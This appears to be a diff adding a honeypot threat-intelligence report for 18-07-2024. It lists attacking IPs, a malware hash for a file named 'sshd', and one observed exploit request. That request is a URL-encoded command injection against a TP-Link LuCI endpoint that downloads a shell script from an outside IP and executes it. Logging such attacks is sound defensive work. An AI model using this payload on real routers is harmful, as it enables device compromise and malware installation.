@@ -1,0 +1,19 @@
+Top 5 IPs for 18-07-2024 :
+
+59.34.57.200
+43.139.62.66
+43.205.127.9
+49.75.116.20
+218.93.15.230
+
+Malware Observed:
+
+File name: sshd
+97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb
+https://www.virustotal.com/gui/file/97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb
+
+
+
+Commands/exploits observed:
+
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60)
